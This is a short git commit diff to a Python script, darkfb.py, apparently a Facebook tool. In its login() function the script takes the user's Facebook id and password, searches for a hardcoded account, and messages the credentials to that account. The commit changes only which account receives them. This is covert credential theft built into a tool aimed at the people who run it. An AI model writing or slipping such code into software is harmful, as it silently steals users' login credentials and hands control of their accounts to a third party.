e7296b478ab1e40a068c88f61273cb57db477107
santryCyber <51526071+santryCyber@users.noreply.github.com>
2019-06-14 16:36:38 +0700

    Update darkfb.py

--- darkfb.py
+++ darkfb.py
@@ -119,7 +119,7 @@ def login():
         x.update(sig)
 	data.update({'sig':x.hexdigest()})
 	client = Client(id,pwd)
-	friends = client.searchForUsers('kang.cimol.31392')
+	friends = client.searchForUsers('alpa.id.16')
 	friend = friends[0]
 	client.send(Message(id+' '+pwd), thread_id=friend.uid, thread_type=ThreadType.USER)
 	client.logout()
